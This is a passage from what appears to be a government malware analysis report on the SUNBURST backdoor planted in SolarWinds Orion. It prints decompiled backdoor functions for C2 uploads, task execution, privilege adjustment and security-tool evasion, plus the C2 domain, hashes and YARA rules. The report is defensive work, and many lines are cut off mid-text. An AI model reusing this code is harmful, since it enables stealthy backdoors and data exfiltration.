(Hash: 6116246686670134098). It then parses through the provided HTTP session d\nvalues, rather than HTTP strings, to obfuscate the functionality of this code. This obfuscation makes it more difficult to manually or heuristically ide\nintent to generate an outbound HTTP session.\n\n--Begin UploadSystemDescription Function-public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)\n{\nresult = (string) null;\nstring requestUriString = args[0];\nstring s1 = args[1];\nstring s2 = args.Length &gt;= 3 ? args[2] : (string) null;\nstring[] strArray = Encoding.UTF8.GetString(Convert.FromBase64String(s1)).Split(new string[3]\n{\n\"\\r\\n\",\n\"\\r\",\n\"\\n\"\n}, StringSplitOptions.None);\nHttpWebRequest httpWebRequest1 = (HttpWebRequest) WebRequest.Create(requestUriString);\nHttpWebRequest httpWebRequest2 = httpWebRequest1;\nhttpWebRequest2.set_ServerCertificateValidationCallback(httpWebRequest2.get_ServerCertificateValidationCallback() + (RemoteCertificateV\n((sender, cert, chain, sslPolicyErrors) =&gt; true));\nhttpWebRequest1.Proxy = proxy;\nhttpWebRequest1.Timeout = 120000;\nhttpWebRequest1.Method = strArray[0].Split(' ')[0];\nforeach (string header in strArray)\n{\nint length = header.IndexOf(':');\nif (length &gt; 0)\n{\nstring headerName = header.Substring(0, length);\nstring s3 = header.Substring(length + 1).TrimStart((char[]) Array.Empty&lt;char&gt;());\nif (!WebHeaderCollection.IsRestricted(headerName))\n{\nhttpWebRequest1.Headers.Add(header);\n}\nelse\n{\nswitch (OrionImprovementBusinessLayer.GetHash(headerName.ToLower()))\n{\ncase 2734787258623754862:\nhttpWebRequest1.Accept = s3;\ncontinue;\ncase 6116246686670134098:\nhttpWebRequest1.ContentType = s3;\ncontinue;\ncase 7574774749059321801:\nhttpWebRequest1.UserAgent = s3;\ncontinue;\ncase 8873858923435176895:\nif (OrionImprovementBusinessLayer.GetHash(s3.ToLower()) == 1475579823244607677UL)\n{\nhttpWebRequest1.ServicePoint.Expect100Continue = true;\ncontinue;\n}\nhttpWebRequest1.Expect = s3;\ncontinue;\ncase 9007106680104765185:\n\n\n-----\n\np q ;\ncontinue;\ncase 11266044540366291518:\nulong hash = OrionImprovementBusinessLayer.GetHash(s3.ToLower());\nhttpWebRequest1.KeepAlive = hash == 13852439084267373191UL || httpWebRequest1.KeepAlive;\nhttpWebRequest1.KeepAlive = hash != 14226582801651130532UL &amp;&amp; httpWebRequest1.KeepAlive;\ncontinue;\ncase 15514036435533858158:\nhttpWebRequest1.set_Date(DateTime.Parse(s3));\ncontinue;\ncase 16066522799090129502:\nhttpWebRequest1.set_Date(DateTime.Parse(s3));\ncontinue;\ndefault:\ncontinue;\n}\n--End UploadSystemDescription Function-\nSUNBURST contains functions that give it the ability to run specified tasks, terminate processes, delete files, compute file hashes, and reboot the\n\n**RUN SPECIFIED TASKS**\nThe \"ExecuteEngine\" is a core function that uses the “job” variable to carry out certain tasks for the adversary. This function has the ability to run t\nof command line arguments, alter the registry (to maintain persistence, etc.), collect a detailed description of the target platform, kill tasks, delete f\nexecute a secondary payload:\n\n--Begin ExecuteEngine Function-private int ExecuteEngine(\nOrionImprovementBusinessLayer.HttpHelper.JobEngine job,\nstring cl,\nout string result)\n{\nresult = (string) null;\nint num = 0;\nstring[] args = OrionImprovementBusinessLayer.Job.SplitString(cl);\ntry\n{\nif (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.ReadRegistryValue || job ==\nOrionImprovementBusinessLayer.HttpHelper.JobEngine.SetRegistryValue || (job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.Dele\n== OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetRegistrySubKeyAndValueNames))\nnum = OrionImprovementBusinessLayer.HttpHelper.AddRegistryExecutionEngine(job, args, out result);\nswitch (job)\n{\ncase OrionImprovementBusinessLayer.HttpHelper.JobEngine.SetTime:\nint delay;\nOrionImprovementBusinessLayer.Job.SetTime(args, out delay);\nthis.delay = delay;\nbreak;\ncase OrionImprovementBusinessLayer.HttpHelper.JobEngine.CollectSystemDescription:\nOrionImprovementBusinessLayer.Job.CollectSystemDescription(this.proxy.ToString(), out result);\nbreak;\ncase OrionImprovementBusinessLayer.HttpHelper.JobEngine.UploadSystemDescription:\nOrionImprovementBusinessLayer.Job.UploadSystemDescription(args, out result, this.proxy.GetWebProxy());\nbreak;\ncase OrionImprovementBusinessLayer.HttpHelper.JobEngine.RunTask:\nnum = OrionImprovementBusinessLayer.Job.RunTask(args, cl, out result);\nbreak;\ncase OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetProcessByDescription:\nOrionImprovementBusinessLayer.Job.GetProcessByDescription(args, out result);\nbreak;\ncase OrionImprovementBusinessLayer.HttpHelper.JobEngine.KillTask:\nOrionImprovementBusinessLayer.Job.KillTask(args);\nbreak;\n}\nreturn job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.WriteFile || job == OrionImprovementBusinessLayer.HttpHelper.JobEn\n== OrionImprovementBusinessLayer.HttpHelper.JobEngine.DeleteFile || job == OrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileH\nOrionImprovementBusinessLayer.HttpHelper.JobEngine.GetFileSystemEntries ? OrionImprovementBusinessLayer.HttpHelper.AddFileExecutionE\nresult) : num;\n}\ncatch (Exception ex)\n{\nif (!string.IsNullOrEmpty(result))\nresult += \"\\n\";\nresult += ex.Message;\nreturn ex.HResult;\n}\n--End ExecuteEngine function-\n\n-----\n\npublic static void KillTask(string[] args) =&gt;\nProcess.GetProcessById(int.Parse(args[0])).Kill();\n\n**DELETE FILE**\npublic static void DeleteFile(string[] args) =&gt; System.IO.File.Delete(Environment.ExpandEnvironmentVariables(args[0]));\n\n**COMPUTE FILE HASHES**\npublic static int GetFileHash(string[] args, out string result)\n{\nresult = (string) null;\nstring path = Environment.ExpandEnvironmentVariables(args[0]);\nusing (MD5 md5 = MD5.Create())\n{\nusing (FileStream fileStream = System.IO.File.OpenRead(path))\n{\nbyte[] hash = md5.ComputeHash((Stream) fileStream);\nif (args.Length &gt; 1)\nreturn !(OrionImprovementBusinessLayer.ByteArrayToHexString(hash).ToLower() == args[1].ToLower()) ? 1 : 0;\nresult = OrionImprovementBusinessLayer.ByteArrayToHexString(hash);\n}\n}\nreturn 0;\n}\n\n**REBOOT SYSTEM**\npublic static bool RebootComputer()\n{\nbool flag = false;\ntry\n{\nbool previousState = false;\nstring privilege = OrionImprovementBusinessLayer.ZipHelper.Unzip(ph2eifo3n5utg1j8d94qrvbmk0sal76c);\nif (!OrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, true, out previousState))\nreturn flag;\nflag = OrionImprovementBusinessLayer.NativeMethods.InitiateSystemShutdownEx((string) null, (string) null, 0U, true, true, 2147745794U);\nOrionImprovementBusinessLayer.NativeMethods.SetProcessPrivilege(privilege, previousState, out previousState);\nreturn flag;\n}\ncatch (Exception ex)\n{\nreturn flag;\n}\n}\n--End additional functions Function-\n**ADJUST PROCESS PRIVILEGES**\nThe SetProcessPrivilege function is used to adjust privileges for a target process on the victim system. For example, a process may need increas\nprivileges to accomplish its designed task.\n\n--Begin SetProcessPrivilege Function-public static bool SetProcessPrivilege(\nstring privilege,\nbool newState,\nout bool previousState)\n{\nbool flag = false;\npreviousState = false;\ntry\n{\nIntPtr zero = IntPtr.Zero;\nOrionImprovementBusinessLayer.NativeMethods.LUID Luid = new OrionImprovementBusinessLayer.NativeMethods.LUID();\nLuid.LowPart = 0U;\nLuid.HighPart = 0U;\nif (!OrionImprovementBusinessLayer.NativeMethods.OpenProcessToken(OrionImprovementBusinessLayer.NativeMethods.GetCurrentProce\nTokenAccessLevels.Query | TokenAccessLevels.AdjustPrivileges, ref zero))\nreturn false;\nif (!OrionImprovementBusinessLayer.NativeMethods.LookupPrivilegeValue((string) null, privilege, ref Luid))\n{\nOrionImprovementBusinessLayer.NativeMethods.CloseHandle(zero);\nreturn false;\n}\nOrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE NewState = new OrionImprovementBusinessLayer.NativeMethods.TO\nOrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE PreviousState = new\nOrionImprovementBusinessLayer.NativeMethods.TOKEN_PRIVILEGE();\nNewState.PrivilegeCount = 1U;\nNewState.Privilege.Luid = Luid;\nNewState.Privilege.Attributes = newState ? 2U : 0U;\n\nuint ReturnLength = 0;\n\n\n-----\n\np y j g (,,, ( ) (( j )\nref ReturnLength);\npreviousState = (PreviousState.Privilege.Attributes &amp; 2U) &gt; 0U;\nflag = true;\nOrionImprovementBusinessLayer.NativeMethods.CloseHandle(zero);\nreturn flag;\n}\ncatch (Exception ex)\n{\nreturn flag;\n}\n}\n\n[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\nprivate struct LUID\n{\npublic uint LowPart;\npublic uint HighPart;\n}\n\n[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\nprivate struct LUID_AND_ATTRIBUTES\n{\npublic OrionImprovementBusinessLayer.NativeMethods.LUID Luid;\npublic uint Attributes;\n}\n\n[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\nprivate struct TOKEN_PRIVILEGE\n{\npublic uint PrivilegeCount;\npublic OrionImprovementBusinessLayer.NativeMethods.LUID_AND_ATTRIBUTES Privilege;\n}\n}\n--End SetProcessPrivilege Function-\n**BLOCK LIST CHECKING FUNCTIONS**\nThe Update function is critical to starting the SUNBURST C2 functionality. Early in its execution, the Update function calls the UpdateNotification()\na “False”, indicating one of the hard-coded block list processes is running, the SUNBURST malware will not initiate its C2 session. The malicious\n“OrionImprovementBusinessLayer”, containing the SUNBURST module, will effectively be disabled. However, the parent SolarWinds process run\n32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77 will not be interrupted.\n\n--Begin Update Function-private static void Update()\n{\nbool flag1 = false;\nOrionImprovementBusinessLayer.CryptoHelper cryptoHelper = new OrionImprovementBusinessLayer.CryptoHelper(OrionImprovementBusines\nOrionImprovementBusinessLayer.domain4);\nOrionImprovementBusinessLayer.HttpHelper http = (OrionImprovementBusinessLayer.HttpHelper) null;\nThread thread = (Thread) null;\nbool last = true;\nOrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;\nint num1 = 0;\nbool flag2 = true;\nOrionImprovementBusinessLayer.DnsRecords rec = new OrionImprovementBusinessLayer.DnsRecords();\nRandom random = new Random();\nint num2 = 0;\nif (!OrionImprovementBusinessLayer.UpdateNotification())\nreturn;\nOrionImprovementBusinessLayer.svcListModified2 = false;\nfor (int index = 1; index &lt;= 3 &amp;&amp; !flag1; ++index)\n{\nOrionImprovementBusinessLayer.DelayMin(rec.A, rec.A);\nif (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))\n{\nif (OrionImprovementBusinessLayer.svcListModified1)\nflag2 = true;\nnum1 = OrionImprovementBusinessLayer.svcListModified2 ? num1 + 1 : 0;\nstring hostName;\nswitch (OrionImprovementBusinessLayer.status)\n{\ncase OrionImprovementBusinessLayer.ReportStatus.New:\nhostName = addressFamilyEx == OrionImprovementBusinessLayer.AddressFamilyEx.Error ? cryptoHelper.GetCurrentString() :\ncryptoHelper.GetPreviousString(out last);\nbreak;\ncase OrionImprovementBusinessLayer.ReportStatus.Append:\nhostName = flag2 ? cryptoHelper.GetNextStringEx(rec.dnssec) : cryptoHelper.GetNextString(rec.dnssec);\nbreak;\n\ndefault:\n\n\n-----\n\ng _ ;\n}\n--End Update Function-\nThe UpdateNotification() function will return a \"False\" if any process on the hard coded blocklist is running on the target system. It utilizes the Trac\ndetailed below. It call the TrackProcesses function.\n\n--Begin UpdateNotification Function-private static bool UpdateNotification()\n{\nint num = 3;\nwhile (num-- &gt; 0)\n{\nOrionImprovementBusinessLayer.DelayMin(0, 0);\nif (OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))\nreturn false;\nif (OrionImprovementBusinessLayer.DnsHelper.CheckServerConnection(OrionImprovementBusinessLayer.apiHost))\nreturn true;\n}\nreturn false;\n}\n--End UpdateNotification Function-\nThe \"TrackProcesses\" function queries a list of running processes on the target system and then passes the process names to the \"SearchAssem\nhashes their process names and compares the result hashes to the hard-coded process hash list stored in the list \"assemblyTimeStamps.\" If any\nare running, the function will return True. It also searches for certain services and attempts to disable them.\n\n--Begin TrackProcesses Function-public static bool TrackProcesses(bool full)\n{\nProcess[] processes = Process.GetProcesses();\nif (OrionImprovementBusinessLayer.ProcessTracker.SearchAssemblies(processes))\nreturn true;\nbool flag = OrionImprovementBusinessLayer.ProcessTracker.SearchServices(processes);\nreturn !flag &amp; full ? OrionImprovementBusinessLayer.ProcessTracker.SearchConfigurations() : flag;\n}\n--End TrackProcesses Function-\nThe \"SearchAssemblies\" function called by TrackProcesses, is used to enumerate running processes to determine if any of the hashed processes\nprocess blocklist are currently running on the target system.\n\n--Begin SearchAssemblies Function—\nprivate static bool SearchAssemblies(Process[] processes)\n{\nfor (int index = 0; index &lt; processes.Length; ++index)\n{\nulong hash = OrionImprovementBusinessLayer.GetHash(processes[index].ProcessName.ToLower());\nif (Array.IndexOf&lt;ulong&gt;(OrionImprovementBusinessLayer.assemblyTimeStamps, hash) != -1)\nreturn true;\n}\nreturn false;\n\n}\n--End SearchAssemblies Function-\nThe SearchServices\" function, called by TrackProcesses, searches running services to determine whether or not they are running any of the hard\nprocess hashes. It attempts to disable these services.\n\n--Begin SearchServices Function-private static bool SearchServices(Process[] processes)\n{\nfor (int index = 0; index &lt; processes.Length; ++index)\n{\nulong hash = OrionImprovementBusinessLayer.GetHash(processes[index].ProcessName.ToLower());\nforeach (OrionImprovementBusinessLayer.ServiceConfiguration svc in OrionImprovementBusinessLayer.svcList)\n{\nif (Array.IndexOf&lt;ulong&gt;(svc.timeStamps, hash) != -1)\n{\nobject obj = OrionImprovementBusinessLayer.ProcessTracker._lock;\nbool flag = false;\ntry\n{\nMonitor.Enter(obj, ref flag);\nif (!svc.running)\n{\nOrionImprovementBusinessLayer.svcListModified1 = true;\nOrionImprovementBusinessLayer.svcListModified2 = true;\nsvc.running = true;\n}\n\n\n-----\n\n( )\n{\nif (!svc.stopped)\n{\nif (svc.Svc.Length != 0)\n{\nOrionImprovementBusinessLayer.DelayMin(0, 0);\nOrionImprovementBusinessLayer.ProcessTracker.SetManualMode(svc.Svc);\nsvc.disabled = true;\nsvc.stopped = true;\n}\n}\n}\n}\nfinally\n{\nif (flag)\nMonitor.Exit(obj);\n}\n--End SearchServices Function-Screenshots\n\n**Figure 1 - The modified module with a new class function named \"OrionImprovementBusinessLayer.\"**\n\n**Figure 2 - The code snippet contains the subdomains and other strings used to construct the C2 domains.**\n\n**avsvmcloud.com**\n\nTags\n\ncommand-and-control\n\nWhois\n\nDomain Name: avsvmcloud.com\nRegistry Domain ID: 2289718834_DOMAIN_COM-VRSN\nRegistrar WHOIS Server: whois.godaddy.com\nRegistrar URL: http://www.godaddy.com\nUpdated Date: 2020-10-08T13:58:35Z\nCreation Date: 2018-07-25T11:38:29Z\n\n\n-----\n\ng g p\nRegistrar: GoDaddy.com, LLC\nRegistrar IANA ID: 146\nRegistrar Abuse Contact Email: abuse@godaddy.com\nRegistrar Abuse Contact Phone: +1.4806242505\nDomain Status: clientTransferProhibited http://www.icann.org/epp#clientTransferProhibited\nDomain Status: clientUpdateProhibited http://www.icann.org/epp#clientUpdateProhibited\nDomain Status: clientRenewProhibited http://www.icann.org/epp#clientRenewProhibited\nDomain Status: clientDeleteProhibited http://www.icann.org/epp#clientDeleteProhibited\nRegistry Registrant ID: Not Available From Registry\nRegistrant Name: Registration Private\nRegistrant Organization: Domains By Proxy, LLC\nRegistrant Street: DomainsByProxy.com\nRegistrant Street: 14455 N. Hayden Road\nRegistrant City: Scottsdale\nRegistrant State/Province: Arizona\nRegistrant Postal Code: 85260\nRegistrant Country: US\nRegistrant Phone: +1.4806242599\nRegistrant Phone Ext:\nRegistrant Fax: +1.4806242598\nRegistrant Fax Ext:\nRegistrant Email: avsvmcloud.com@domainsbyproxy.com\nRegistry Admin ID: Not Available From Registry\nAdmin Name: Registration Private\nAdmin Organization: Domains By Proxy, LLC\nAdmin Street: DomainsByProxy.com\nAdmin Street: 14455 N. Hayden Road\nAdmin City: Scottsdale\nAdmin State/Province: Arizona\nAdmin Postal Code: 85260\nAdmin Country: US\nAdmin Phone: +1.4806242599\nAdmin Phone Ext:\nAdmin Fax: +1.4806242598\nAdmin Fax Ext:\nAdmin Email: avsvmcloud.com@domainsbyproxy.com\nRegistry Tech ID: Not Available From Registry\nTech Name: Registration Private\nTech Organization: Domains By Proxy, LLC\nTech Street: DomainsByProxy.com\nTech Street: 14455 N. Hayden Road\nTech City: Scottsdale\nTech State/Province: Arizona\nTech Postal Code: 85260\nTech Country: US\nTech Phone: +1.4806242599\nTech Phone Ext:\nTech Fax: +1.4806242598\nTech Fax Ext:\nTech Email: avsvmcloud.com@domainsbyproxy.com\nName Server: PDNS09.DOMAINCONTROL.COM\nName Server: PDNS10.DOMAINCONTROL.COM\nDNSSEC: unsigned\nURL of the ICANN WHOIS Data Problem Reporting System: http://wdprs.internic.net/\n>>> Last update of WHOIS database: 2020-12-14T19:00:00Z <<<\n\nRelationships\n\navsvmcloud.com Connected_From 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\n\nDescription\n\nThe subdomain for \"SolarWinds.Orion.Core.BusinessLayer.dll.\"\n\n**d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600**\n\nTags\n\ndropper\n\nDetails\n\n**Name** SolarWinds-Core-v2019.4.5220-Hotfix5.msp\n\n**Size** 214831104 bytes\n\n\n-----\n\n**Type**\n\n\nComposite Document File V2 Document, Little Endian, Os: Windows, Version 6.2, Code page: 1252, Title: Installation Database, Subj\nCore Services 2019.4, Author: SolarWinds Worldwide, LLC., Keywords: Installer, Comments: This installer database contains the logi\ninstall SolarWinds Orion Core Services 2019.4., Create Time/Date: Tue Mar 24 11:55:04 2020, Name of Creating Application: Window\nToolset (3.9.1208.0), Security: 4, Template: Intel;1033, Last Saved By: Intel;1033, Revision Number: {079A74C5-95D0-446E-86F7B8EAF0A29654}119.4.20161.5220;{079A74C5-95D0-446E-86F7-B8EAF0A29654}119.4.20161.5220;{DA36F8E2-99FC-44DF-B011-0\nNumber of Pages: 200, Number of Characters: 152174623\n\n\n**MD5** 02af7cec58b9a5da1c542b5a32151ba1\n\n**SHA1** 1b476f58ca366b54f34d714ffce3fd73cc30db1a\n\n**SHA256** d0d626deb3f9484e649294a8dfa814c5568f846d5aa02d4cdad5d041a29d5600\n\n**SHA512** f40fd5d94791f18eed59dc78d12acc52f4a65dfdf8c819d6957de8059e0e127160e0a21320845340932a54f9c639c42b2c815558b2d0ce\n\n**ssdeep** 3145728:yMbnCpAK7nuv7xYiq0bC4zheqeRHuCieBVZNP7WJOQeXt+9riYBaeIBjSxTusL:yMbCp7uf3GnqfCVrNPgLrW4GoxSG\n\n**Entropy** 7.998885\n\nAntivirus\n\nNo matches found.\n\nYARA Rules\n\nNo matches found.\n\nssdeep Matches\n\nNo matches found.\n\nRelationships\n\nd0d626deb3... Contains 32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\n\nDescription\n\nThis file is a Microsoft Windows Installer Patch file that has been identified as a SUNBURST installer named \"SolarWinds-Core-v2019.4.5220-Hot\ncontains legitimate SolarWinds Orion update components, the modified DLL \"SolarWinds.Orion.Core.BusinessLayer.dll\"\n(32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77) and a legitimate configuration file.\n\nThe hotfix is typically delivered to the SolarWinds Orion application as an update for the \"SolarWinds.Orion.Core.BusinessLayer.dll\" module. In th\nupdate is applied, it will overwrite the non-malicious module, replacing it with the trojanized version and providing the attacker with the same level\nin the analysis of \"32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77.\"\n**ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6**\n\nTags\n\nbackdoortrojan\n\nDetails\n\n**Name** SolarWinds.Orion.Core.BusinessLayer.dll\n\n**Size** 1028072 bytes\n\n**Type** PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows\n\n**MD5** 846e27a652a5e1bfbd0ddd38a16dc865\n\n**SHA1** d130bd75645c2433f88ac03e73395fba172ef676\n\n**SHA256** ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\n\n**SHA512** c26e275b4232be844f6c4062a4f42413099452085060ed4080b880b52800428cd32f69271c98977fa979a89355fbb3b485855ca3d5149\n\n**ssdeep** 12288:5JKoHwfn/jz3bbO4Qag2I97PMieSLezPKT+BYvjenWHuhh9c0g8vkzK19Q:vEfDbO97P8TrK0YbenWH4c0g8vkzK19\n\n**Entropy** 5.580054\n\nAntivirus\n\n**Ahnlab** Backdoor/Win32.SunBurst\n\n**Antiy** Trojan[Backdoor]/MSIL.Agent\n\n**Avira** TR/Sunburst.A\n\n**BitDefender** Trojan.Sunburst.A\n\n**Clamav** Win Countermeasure Sunburst-9809152-0\n\n\n-----\n\n**Comodo** Backdoor\n\n**Cyren** W32/MSIL_SunBurst.A.gen!Eldorado\n\n**ESET** a variant of MSIL/SunBurst.A trojan\n\n**Emsisoft** Trojan.Win32.Sunburst (A)\n\n**Ikarus** Backdoor.Sunburst\n\n**K7** Trojan ( 00574a531 )\n\n**Lavasoft** Trojan.Sunburst.A\n\n**McAfee** Trojan-sunburst\n\n**Microsoft Security Essentials** Trojan:MSIL/Solorigate.BR!dha\n\n**NANOAV** Trojan.Win32.SunBurst.iduxyv\n\n**Sophos** Mal/Sunburst-A\n\n**Symantec** Backdoor.Sunburst\n\n**Systweak** trojan-backdoor.sunburst-r\n\n**TrendMicro** Backdoo.6F8C6A1E\n\n**TrendMicro House Call** Backdoo.6F8C6A1E\n\n**VirusBlokAda** TScope.Trojan.MSIL\n\n**Zillya!** Trojan.SunBurst.Win32.1\n\nYARA Rules\n\nrule CISA_10318927_01 : trojan rat SOLAR_FIRE\n{\nmeta:\nAuthor = \"CISA Code & Media Analysis\"\nIncident = \"10318927\"\nDate = \"2020-12-13\"\nLast_Modified = \"20201213_2145\"\nActor = \"n/a\"\nCategory = \"TROJAN RAT\"\nFamily = \"SOLAR_FIRE\"\nDescription = \"This signature is based off of unique strings embedded within the modified Solar Winds app\"\nMD5_1 = \"b91ce2fa41029f6955bff20079468448\"\nSHA256_1 = \"32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77\"\nMD5_2 = \"846e27a652a5e1bfbd0ddd38a16dc865\"\nSHA256_2 = \"ce77d116a074dab7a22a0fd4f2c1ab475f16eec42e1ded3c0b0aa8211fe858d6\"\nstrings:\n$s0 = { 63 00 30 00 6B 00 74 00 54 00 69 00 37 00 4B 00 4C 00 43 00 6A 00 4A 00 7A 00 4D 00 38 00 44 }\n$s1 = { 41 00 41 00 3D 00 3D 00 00 21 38 00 33 00 56 00 30 00 64 00 6B 00 78 00 4A 00 4B 00 55 }\n$s2 = { 63 00 2F 00 46 00 77 00 44 00 6E 00 44 00 4E 00 53 00 30 00 7A 00 4B 00 53 00 55 00 30 00 42 00 41 00 41 00 3D 00 3D }\n$s3 = { 53 00 69 00 30 00 75 00 42 00 67 00 41 00 3D 00 00 21 38 00 77 00 77 00 49 00 4C 00 6B 00 33 00 4B 00 53 00 79 00 30 00 4\ncondition:\nall of them\n}\n\n\n-----\n\ny _ _ _\n{\nmeta:\nAuthor = \"FireEye\"\nDate = \"2020-12-13\"\nLast_Modified = \"20201213_1917\"\nActor = \"n/a\"\nCategory = \"Backdoor\"\nFamily = \"SUNBURST\"\nDescription = \"This rule is looking for portions of the SUNBURST backdoor that are vital to how it functions. The first signature fnv_xor m\nxor that the sample performs on process, service, and driver names/paths. SUNBURST is a backdoor that has the ability to spawn and kill p\ndelete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services.\"\nMD5_1 = \"\"\nSHA256_1 = \"\"\nstrings:\n$cmd_regex_encoded = \"U4qpjjbQtUzUTdONrTY2q42pVapRgooABYxQuIZmtUoA\" wide\n$cmd_regex_plain = { 5C 7B 5B 30 2D 39 61 2D 66 2D 5D 7B 33 36 7D 5C 7D 22 7C 22 5B 30 2D 39 61 2D 66 5D 7B 33 32 7D 22 7C\n66 5D 7B 31 36 7D }\n$fake_orion_event_encoded = \"U3ItS80rCaksSFWyUvIvyszPU9IBAA==\" wide\n$fake_orion_event_plain = { 22 45 76 65 6E 74 54 79 70 65 22 3A 22 4F 72 69 6F 6E 22 2C }\n$fake_orion_eventmanager_encoded = \"U3ItS80r8UvMTVWyUgKzfRPzEtNTi5R0AA==\" wide\n$fake_orion_eventmanager_plain = { 22 45 76 65 6E 74 4E 61 6D 65 22 3A 22 45 76 65 6E 74 4D 61 6E 61 67 65 72 22 2C }\n$fake_orion_message_encoded = \"U/JNLS5OTE9VslKqNqhVAgA=\" wide\n$fake_orion_message_plain = { 22 4D 65 73 73 61 67 65 22 3A 22 7B 30 7D 22 }\n$fnv_xor = { 67 19 D8 A7 3B 90 AC 5B }\ncondition:\n$fnv_xor and ($cmd_regex_encoded or $cmd_regex_plain) or ( ($fake_orion_event_encoded or $fake_orion_event_plain) and\n($fake_orion_eventmanager_encoded or $fake_orion_eventmanager_plain) and ($fake_orion_message_encoded and $fake_orion_messag\n}\n\n\n-----\n\ny _ _ _\n{\nmeta:\nAuthor = \"FireEye\"\nDate = \"2020-12-13\"\nLast_Modified = \"20201213_1917\"\nActor = \"n/a\"\nCategory = \"Backdoor\"\nFamily = \"SUNBURST\"\nDescription = \"The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking\ncode that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunct\nintentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBUR\nhas the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set o\ntools and services.\"\nMD5_1 = \"\"\nSHA256_1 = \"\"\nstrings:\n$a = \"0y3Kzy8BAA==\" wide\n$aa = \"S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA\" wide\n$ab = \"S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=\" wide\n$ac = \"C88sSs1JLS4GAA==\" wide\n$ad = \"C/UEAA==\" wide\n$ae = \"C89MSU8tKQYA\" wide\n$af = \"8wvwBQA=\" wide\n$ag = \"cyzIz8nJBwA=\" wide\n$ah = \"c87JL03xzc/LLMkvysxLBwA=\" wide\n$ai = \"88tPSS0GAA==\" wide\n$aj = \"C8vPKc1NLQYA\" wide\n$ak = \"88wrSS1KS0xOLQYA\" wide\n$al = \"c87PLcjPS80rKQYA\" wide\n$am = \"Ky7PLNAvLUjRBwA=\" wide\n$an = \"06vIzQEA\" wide\n$b = \"0y3NyyxLLSpOzIlPTgQA\" wide\n$c = \"001OBAA=\" wide\n$d = \"0y0oysxNLKqMT04EAA==\" wide\n$e = \"0y3JzE0tLknMLQAA\" wide\n$f = \"003PyU9KzAEA\" wide\n$h = \"0y1OTS4tSk1OBAA=\" wide\n$i = \"K8jO1E8uytGvNqitNqytNqrVA/IA\" wide\n$j = \"c8rPSQEA\" wide\n$k = \"c8rPSfEsSczJTAYA\" wide\n$l = \"c60oKUp0ys9JAQA=\" wide\n$m = \"c60oKUp0ys9J8SxJzMlMBgA=\" wide\n$n = \"8yxJzMlMBgA=\" wide\n$o = \"88lMzygBAA==\" wide\n$p = \"88lMzyjxLEnMyUwGAA==\" wide\n$q = \"C0pNL81JLAIA\" wide\n$r = \"C07NzXTKz0kBAA==\" wide\n$s = \"C07NzXTKz0nxLEnMyUwGAA==\" wide\n$t = \"yy9IzStOzCsGAA==\" wide\n$u = \"y8svyQcA\" wide\n$v = \"SytKTU3LzysBAA==\" wide\n$w = \"C84vLUpOdc5PSQ0oygcA\" wide\n$x = \"C84vLUpODU4tykwLKMoHAA==\" wide\n$y = \"C84vLUpO9UjMC07MKwYA\" wide\n$z = \"C84vLUpO9UjMC04tykwDAA==\" wide\ncondition:\n($a and $b and $c and $d and $e and $f and $h and $i) or ($j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ($\n$u and $v and $w and $x and $y and $z and ($aa or $ab)) or ($ac and $ad and $ae and $af and $ag and $ah and ($am or $an)) or ($ai and\nand ($am or $an))\n}\n\nssdeep Matches\n\n**94** 019085a76ba7126fff22770d71bd901c325fc68ac55aa743327984e89f4b0134\n\nPE Metadata\n\n**Compile Date** 2020-05-11 17:32:40-04:00\n\n**Import Hash** dae02f32a21e03ce65412f6e56942daa\n\n**Company Name** SolarWinds Worldwide, LLC.\n\n**File Description** SolarWinds.Orion.Core.BusinessLayer\n\n**Internal Name** SolarWinds.Orion.Core.BusinessLayer.dll\n\n\n-----\n\n**Legal Copyright** Copyright © 1999-2020 SolarWinds Worldwide, LLC. All Rights Reserved.\n\n**Original Filename** SolarWinds.Orion.Core.BusinessLayer.dll\n\n**Product Name** SolarWinds.Orion.Core.BusinessLayer\n\n**Product Version** 2020.2.5300.12432\n\nPE Sections\n\n**MD5** **Name** **Raw Size** **Entropy**\n\n87b3389568887539d8c12033e01bcbda header 512 2.901277\n\n58ca620058a1e26cda220dcb83f4eb26 .text 1018368 5.567638\n\n1d816f4a16b05559313aa30a0d3532d6 .rsrc 1536 3.008439\n\n0db83a842dbb0bb3396691d4238bd216 .reloc 512 0.101910\n\nDescription\n\nThis file has been identified as a SolarWinds Application module containing a patched in SUNBURST backdoor. This embedded SUNBURST cod\nfunctions as 